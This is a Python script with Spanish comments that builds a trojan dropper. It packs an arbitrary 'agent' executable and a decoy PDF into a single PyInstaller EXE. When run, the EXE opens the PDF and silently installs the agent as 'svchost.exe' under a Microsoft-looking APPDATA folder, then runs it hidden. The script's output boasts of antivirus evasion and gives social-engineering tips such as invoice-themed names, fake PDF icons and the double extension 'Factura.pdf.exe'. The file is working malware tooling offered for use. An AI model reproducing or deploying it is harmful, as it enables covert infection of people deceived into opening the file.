#!/usr/bin/env python3
"""
embedded_dropper.py - Generador de Dropper EXE con PDF y Agente Embebidos

Crea un ejecutable que:
1. Extrae y abre un PDF real (decoy)
2. Extrae y ejecuta el agente en segundo plano
3. Todo embebido en un solo .exe (sin descargas)
4. Puede compilarse con icono personalizado

Sin network activity = bypass AV
"""

import argparse
import base64
import os
import sys
import subprocess
from pathlib import Path


DROPPER_TEMPLATE = '''
import os
import sys
import tempfile
import subprocess
import base64
from pathlib import Path

# PDF embebido (Base64)
PDF_DATA = b"""{pdf_b64}"""

# Agente embebido (Base64)
AGENT_DATA = b"""{agent_b64}"""

def main():
    try:
        # Directorio temporal
        temp_dir = Path(os.environ.get('TEMP', '/tmp'))
        
        # Extraer y abrir PDF
        pdf_data = base64.b64decode(PDF_DATA)
        pdf_path = temp_dir / "{pdf_name}"
        
        with open(pdf_path, 'wb') as f:
            f.write(pdf_data)
        
        # Abrir PDF con aplicación por defecto
        if sys.platform == 'win32':
            os.startfile(str(pdf_path))
        else:
            subprocess.Popen(['xdg-open', str(pdf_path)], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
        
        # Extraer agente a ubicación persistente
        agent_data = base64.b64decode(AGENT_DATA)
        
        if sys.platform == 'win32':
            # Windows: %APPDATA%\\Microsoft\\Windows\\Caches\\
            agent_dir = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Caches'
            agent_dir.mkdir(parents=True, exist_ok=True)
            agent_path = agent_dir / "{agent_name}"
        else:
            agent_path = temp_dir / "{agent_name}"
        
        with open(agent_path, 'wb') as f:
            f.write(agent_data)
        
        # Dar permisos de ejecución (Linux/Mac)
        if sys.platform != 'win32':
            os.chmod(agent_path, 0o755)
        
        # Ejecutar agente en segundo plano
        if sys.platform == 'win32':
            # Windows: sin ventana, proceso separado
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            
            subprocess.Popen(
                [str(agent_path)],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                [str(agent_path)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
        
    except Exception as e:
        # Silencioso en producción
        pass

if __name__ == '__main__':
    main()
'''


def create_dummy_pdf():
    """Crear un PDF mínimo válido"""
    pdf_content = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Resources 4 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
4 0 obj
<< /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT
/F1 12 Tf
100 700 Td
(Documento cargado) Tj
ET
endstream
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000214 00000 n 
0000000301 00000 n 
trailer
<< /Size 6 /Root 1 0 R >>
startxref
394
%%EOF
"""
    return pdf_content


def build_embedded_dropper(agent_path, output_py, pdf_path=None, agent_name=None, pdf_name=None):
    """Genera el dropper Python con todo embebido"""
    
    print(f"[🔧] Generando dropper embebido...")
    
    # Leer agente
    with open(agent_path, 'rb') as f:
        agent_data = f.read()
    
    agent_b64 = base64.b64encode(agent_data).decode('utf-8')
    
    # Leer o crear PDF
    if pdf_path and os.path.exists(pdf_path):
        with open(pdf_path, 'rb') as f:
            pdf_data = f.read()
        print(f"[✅] Usando PDF: {pdf_path}")
    else:
        pdf_data = create_dummy_pdf()
        print(f"[ℹ️] Usando PDF dummy (crea uno real para mejor evasión)")
    
    pdf_b64 = base64.b64encode(pdf_data).decode('utf-8')
    
    # Nombres aleatorios si no se especifican
    if not agent_name:
        agent_name = "svchost.exe"
    if not pdf_name:
        pdf_name = "documento.pdf"
    
    # Generar código
    dropper_code = DROPPER_TEMPLATE.format(
        pdf_b64=pdf_b64,
        agent_b64=agent_b64,
        pdf_name=pdf_name,
        agent_name=agent_name
    )
    
    # Guardar
    with open(output_py, 'w', encoding='utf-8') as f:
        f.write(dropper_code)
    
    print(f"[✅] Dropper generado: {output_py}")
    
    # Mostrar tamaños
    agent_size_mb = len(agent_data) / (1024 * 1024)
    pdf_size_kb = len(pdf_data) / 1024
    print(f"[📊] Agente embebido: {agent_size_mb:.2f} MB")
    print(f"[📊] PDF embebido: {pdf_size_kb:.1f} KB")
    
    return True


def compile_to_exe(py_path, output_exe, icon_path=None):
    """Compilar el dropper Python a EXE con PyInstaller"""
    
    print(f"\n[🔨] Compilando a EXE...")
    
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--noconsole',
        '--clean',
        '--name', Path(output_exe).stem,
        '--distpath', str(Path(output_exe).parent.resolve()),
        '--workpath', str((Path(output_exe).parent / 'build').resolve()),
        '--specpath', str((Path(output_exe).parent / 'build').resolve()),
    ]
    
    if icon_path and os.path.exists(icon_path):
        cmd.extend(['--icon', str(Path(icon_path).resolve())])
        print(f"[🎨] Usando icono: {icon_path}")
    
    cmd.append(str(Path(py_path).resolve()))
    
    print(f"[⏳] Compilando (esto puede tardar 1-2 minutos)...")
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0 and os.path.exists(output_exe):
        size_mb = os.path.getsize(output_exe) / (1024 * 1024)
        print(f"[✅] EXE generado: {output_exe}")
        print(f"[📊] Tamaño final: {size_mb:.2f} MB")
        return True
    else:
        print(f"[❌] Error compilando:")
        print(result.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(
        description='🎭 Generador de Dropper EXE con PDF y Agente Embebidos',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Ejemplos:
  # Básico: dropper con PDF dummy
  python embedded_dropper.py --agent agent.exe --output Factura.exe
  
  # Con PDF real e icono
  python embedded_dropper.py --agent agent.exe --output Factura.exe \\
      --pdf factura.pdf --icon pdf_icon.ico
  
  # Nombres personalizados
  python embedded_dropper.py --agent agent.exe --output Contrato.exe \\
      --pdf contrato.pdf --icon pdf_icon.ico \\
      --agent-name "winlogon.exe" --pdf-name "contrato_firmado.pdf"

Ventajas:
  ✅ Sin network activity (todo embebido)
  ✅ Abre PDF real como decoy
  ✅ Ejecuta agente en background
  ✅ Single file, fácil de distribuir
  ✅ Icono personalizable
        '''
    )
    
    parser.add_argument('--agent', required=True, help='Ruta al agente (agent.exe)')
    parser.add_argument('--output', required=True, help='Nombre del EXE final')
    parser.add_argument('--pdf', help='PDF real para usar como decoy')
    parser.add_argument('--icon', help='Icono para el EXE (.ico)')
    parser.add_argument('--agent-name', default='svchost.exe', help='Nombre del agente en disco')
    parser.add_argument('--pdf-name', default='documento.pdf', help='Nombre del PDF temporal')
    parser.add_argument('--keep-py', action='store_true', help='No borrar el .py intermedio')
    
    args = parser.parse_args()
    
    # Validar agente
    if not os.path.exists(args.agent):
        print(f"[❌] Error: Agente no encontrado: {args.agent}")
        return 1
    
    # Validar PDF si se especifica
    if args.pdf and not os.path.exists(args.pdf):
        print(f"[⚠️] Warning: PDF no encontrado: {args.pdf}, usando dummy")
        args.pdf = None
    
    # Validar icono si se especifica
    if args.icon and not os.path.exists(args.icon):
        print(f"[⚠️] Warning: Icono no encontrado: {args.icon}")
        args.icon = None
    
    print(f"""
╔════════════════════════════════════════════════════════╗
║  Embedded Dropper Builder - Sin Network Activity      ║
╚════════════════════════════════════════════════════════╝

📋 Configuración:
   • Agente: {args.agent}
   • Output: {args.output}
   • PDF: {args.pdf or 'Dummy PDF'}
   • Icono: {args.icon or 'Sin icono'}
   • Agente en disco: {args.agent_name}
   • PDF temporal: {args.pdf_name}
""")
    
    # Paso 1: Generar dropper Python
    py_path = Path(args.output).parent / f"{Path(args.output).stem}_dropper.py"
    
    if not build_embedded_dropper(
        args.agent, 
        py_path, 
        args.pdf, 
        args.agent_name, 
        args.pdf_name
    ):
        return 1
    
    # Paso 2: Compilar a EXE
    if not compile_to_exe(py_path, args.output, args.icon):
        return 1
    
    # Paso 3: Limpiar .py intermedio
    if not args.keep_py:
        py_path.unlink(missing_ok=True)
        print(f"[🧹] Limpiado: {py_path}")
    
    print(f"""
╔════════════════════════════════════════════════════════╗
║  ✅ Dropper Compilado Exitosamente                     ║
╚════════════════════════════════════════════════════════╝

📁 Archivo: {args.output}

🎯 Comportamiento:
   1. Usuario hace doble-click en {args.output}
   2. Se abre el PDF ({args.pdf_name})
   3. En background, se ejecuta el agente
   4. Todo sin descargar nada de internet

💡 Tips:
   • Renombrar a nombre convincente (ej: Factura_2025.exe)
   • Doble extensión: Factura.pdf.exe (Windows oculta .exe)
   • Compartir en ZIP para preservar icono
   • Probar en VM Windows antes de distribución

⚠️  Sin network activity = Menos detección AV
""")
    
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n[⚠️] Operación cancelada")
        sys.exit(1)
    except Exception as e:
        print(f"\n[❌] Error inesperado: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
